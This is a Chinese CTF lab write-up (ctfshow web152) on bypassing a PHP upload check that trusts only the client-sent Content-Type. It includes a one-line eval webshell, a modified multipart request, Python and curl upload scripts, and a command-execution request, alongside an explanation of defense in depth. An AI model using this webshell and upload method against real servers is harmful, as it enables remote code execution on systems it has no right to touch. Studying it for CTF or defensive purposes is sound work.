---
title: MIME 类型检测绕过
category: 文件上传/MIME绕过
tags: [ctfshow, web152, MIME, Content-Type, 抓包改包, 一句话木马, 防御纵深]
source: ctfshow web152
order: 2
---

## 一句话概括

后端若只查 HTTP 请求里的 `Content-Type`（PHP 里就是 `$_FILES['file']['type']`），那它查的是**客户端自己填的一个字符串**，与文件真实内容毫无关系 —— 抓包把它改成 `image/png` 即可绕过。

## 本题情景与解题手法

### 题目形态

上传页面与 web151 **一模一样**，唯一的变化是后端多了一层 **MIME 类型校验**。也就是说，web151 里那套"抓包把 `filename` 改回 `.php`"的手法到这里会因为 `Content-Type` 不对而被拒。

> 本题与 01 篇（web151）共用同一个页面，区别只在后端。判断"加没加校验"的标准动作：**拿上一题的手法先打一遍，看请求还过得去吗**。

### 第一步：确认新增的这一层校验查的是 `Content-Type`

原笔记的结论很直接：

> 传 png 后缀的木马，使用 BurpSuite 抓包，改回 php 后缀发包即可。这里后端检测的就是这个 `Content-Type`（MIME 类型）。

关键在于：**`filename` 和 `Content-Type` 是 multipart 分片里两个彼此独立的字段**，后端这次只查了后者，所以只改前者不影响判定。

### 第二步：先取 `png` 后缀，让客户端自带 `image/png`

浏览器与常见上传组件是**按扩展名**决定 `Content-Type` 的：

| 文件名 | 客户端自动填的 `Content-Type` |
|---|---|
| `e.png` | `image/png` |
| `e.jpg` | `image/jpeg` |
| `e.php` | `application/octet-stream`（或 `text/php`） |

所以**先给木马取 `png` 后缀**，请求发出去时 `Content-Type` 天然就是"合规"的图片类型 —— 原笔记特别强调这一步"不需要改，就是 `image/png` 类型"。

### 第三步：Burp 抓包，只把 `filename` 改回 `.php`

```http
POST /upload.php HTTP/1.1
Host: 靶机地址
Content-Type: multipart/form-data; boundary=----wb

------wb
Content-Disposition: form-data; name="file"; filename="e.php"
Content-Type: image/png

<?php @eval($_REQUEST['cmd']); ?>
------wb--
```

两个字段的处理办法完全不同：

| 字段 | 原始 | 修改后 | 为什么 |
|---|---|---|---|
| `filename` | `e.png` | **`e.php`** | 决定落盘后缀，必须能被 PHP 解析 |
| `Content-Type` | `image/png` | **不动** | 后端只查这个，保持图片类型就合规 |

> 反过来当然也行：一开始就传 `.php`，然后把 `Content-Type` 手动改成 `image/png`。原文把这点也写明了 —— "如果你一开始传的 php 后缀，则需要改这个 `Content-Type` 为图片类型"。

### 第四步：访问后门、读 flag

文件以 `e.php` 落盘后即可执行：

```http
GET /upload/e.php?cmd=system('tac ../flag.php'); HTTP/1.1
Host: 靶机地址
```

注意用 **`tac` 而不是 `cat`** —— 原笔记："注意要用 tac 查询，而不是 cat，好像被过滤了"。`tac` 把文件按行反向输出，flag 恰好在最后一行时也能直接看到。

### 上传手法一句话总结

> **先取 `png` 后缀让客户端自带 `image/png`** → Burp 抓包**只把 `filename` 改回 `.php`、`Content-Type` 保持图片类型** → 后端 MIME 校验通过、文件仍以 `.php` 落盘 → `e.php?cmd=system('tac ../flag.php')` 读出 flag。

## 原理

### 1. `$_FILES['file']['type']` 到底是什么

一次 multipart 上传，服务端把请求拆成几块，PHP 把它们分别塞进 `$_FILES` 的各个键：

| `$_FILES` 的键 | 值 | 谁提供 | 可信度 |
|---|---|---|---|
| `['name']` | `e.png` | 客户端（`Content-Disposition` 的 `filename`） | **不可信** |
| `['type']` | `image/png` | 客户端（分片的 `Content-Type` 头） | **不可信** |
| `['tmp_name']` | `/tmp/phpXXXXXX` | 服务端临时文件 | 可信 |
| `['size']` | 字节数 | 服务端算的 | 可信 |
| `['error']` | 错误码 | 服务端 | 可信 |

结论：`['type']` 就是**请求头里那个字符串**，服务端连文件的一个字节都没看过。只查它，等于让攻击者"自报家门"。

```php
// 典型的、形同虚设的 MIME 校验
if ($_FILES['file']['type'] != 'image/png') {
    die('文件类型不合规');
}
```

### 2. `Content-Type` 与真实内容是分离的

`Content-Type: image/png` 这个分片里装的是一段 PHP 木马，落盘后 PHP 照样按 `.php` 后缀去执行它 —— 因为**解析走的是文件名后缀，跟 MIME 完全无关**。这就是"MIME 检查能过 ≠ 文件真的是图片"。

![文件上传校验链路与绕过点](../_assets/upload-validation-bypass.svg)

对应图中的 **② 号绕过点**：`filename`、`Content-Type`、文件正文全部由客户端掌控，服务端若不校验真实内容，这一环就形同虚设。

### 3. 既然这么容易绕，为什么还要做 MIME 检查？

这是原笔记「MIME 类型检测」里最值得记的一问，答案是**防御纵深（Defense in Depth）**。

安全从来不是"有用/没用"的二元问题，而是**成本与收益的权衡**：

| 防御层 | 实现成本 | 主要能挡住谁 | 价值 |
|---|---|---|---|
| `Content-Type` 检查 | 1 行代码 | 脚本小子、自动化扫描器 | 性价比极高 |
| 文件内容检测 | 复杂算法 | 中级攻击者 | 高价值但高成本 |
| 行为分析 | 非常高 | 高级定向攻击 | 高价值但极高成本 |

现实里的攻击者分布大致是：

```text
100% 攻击尝试
│
├── 70% 自动化脚本 / 扫描器   ← 只查 Content-Type 就能挡掉
├── 20% 半手动攻击者          ← 需要内容检测
└── 10% 高级定向攻击          ← 需要全方位防御
```

它带来的实际工程价值：

| 角度 | 说明 |
|---|---|
| 安全效果 | 快速丢弃约 70% 的低级/自动化流量 |
| 性能优化 | MIME 检查只是字符串比较；内容检测要读文件解码，开销大。先用廉价检查保护昂贵检查 |
| 运维便利 | 日志里只剩"真正值得看"的请求，减少噪声 |
| 成本考量 | 1 行代码 vs 可观的防御收益 |
| 合规要求 | 很多安全规范明确要求"验证客户端提交的内容类型" |

一个贴切的比喻：**MIME 检查像门口保安问一句"你来干什么"，内容检测像 X 光机**。虽然问话能被撒谎绕过，但它挡住了明显的无关人员、减轻了 X 光机的负担、也给了安保预警时间 —— 就像锁能被撬开，我们依然会锁门。

### 4. MIME 检测 vs 魔术字节检测

两者常被混为一谈，其实是两回事：

| 检测方式 | 检查对象 | 绕过方式 | 详见 |
|---|---|---|---|
| MIME / `Content-Type` | 请求里一个**字符串** | 抓包改头即可 | 本文 |
| 魔术字节 / 文件头 | 文件**正文开头**的字节 | 正文最前面加 `GIF89a`、`\x89PNG` | 03 |
| 后缀检查 | `filename` 的扩展名 | 换可解析后缀 / 大小写 / 双扩展名 | 03 |

## 利用条件

1. **后端存在 MIME 校验**，且只校验 `Content-Type`（不比对真实文件头）
2. **能抓到并修改请求**（Burp 代理，或用脚本直接构造 multipart）
3. **落盘后缀能被解析**（本题后端仍按 `filename` 落盘，改成 `.php` 即可）
4. 服务端**知道落盘路径**（或能从回显/目录遍历推断），才能访问木马

## Payload 速查

| 目的 | 做法 |
|---|---|
| 伪造 MIME 为 PNG | 分片里写 `Content-Type: image/png` |
| 伪造 MIME 为 JPEG / GIF | `Content-Type: image/jpeg` / `image/gif` |
| 绕过前端白名单 + MIME | 选文件时用 `e.png`，抓包把 `filename` 改回 `e.php`，`Content-Type` 不动 |
| 脚本直接指定 MIME | `requests.post(url, files={'file': ('e.php', open('e.php','rb'), 'image/png')})` |
| curl 直接指定 MIME | `curl -F "file=@e.php;type=image/png;filename=e.php" http://靶机地址/upload.php` |

## 完整示例

`e.php` 内容（一句话木马）：

```php
<?php @eval($_REQUEST['cmd']); ?>
```

用 Python 构造一个"文件名是 php、MIME 是 png"的请求：

```python
import requests

url = "http://靶机地址/upload.php"

# files 元组格式: (文件名, 文件对象, Content-Type)
# 第三个参数就是伪造的 MIME —— 后端如果只查 $_FILES['type']，这里写 image/png 即可
with open("e.php", "rb") as f:
    files = {"file": ("e.php", f, "image/png")}
    r = requests.post(url, files=files)

print(r.status_code, r.text[:200])
```

用 curl 等价实现：

```bash
# ;type= 指定 Content-Type，;filename= 指定服务器看到的文件名
curl -i -F "file=@e.php;type=image/png;filename=e.php" http://靶机地址/upload.php
```

上传成功后执行命令：

```http
GET /upload/e.php?cmd=system('tac ../flag.php'); HTTP/1.1
Host: 靶机地址
```

## 踩坑与备注

- **改完 `filename` 要注意 `Content-Length` 自动重算**：Burp 默认会处理；若是手工拼包，长度对不上请求会被截断。
- **`$_FILES['type']` 只在 multipart 上传里存在**：如果题目走的是 `php://input` 直读原始体，就没有这个键，MIME 校验也就无从谈起。
- **别忘了 `tac`**：本题 `cat` 被过滤，原笔记明确记了这一点；这条经验在后续几道题里一直沿用。
- **MIME 检查常常与后缀检查同时出现**：本题只卡 MIME；到了 web153 就变成卡后缀（见 03 篇），两道题的绕过方向完全不同，别混用。
- 原笔记「MIME 类型检测」讨论的是"为什么明知可绕还要做"，属于**防御视角**；本题是**攻击视角**。两者对照看，才能理解 CTF 里"逐层突破"的设计意图。
- 一张通用的「校验类型 → 绕过手法」对照表在 01 篇，本文只补充 MIME 相关行，避免重复。
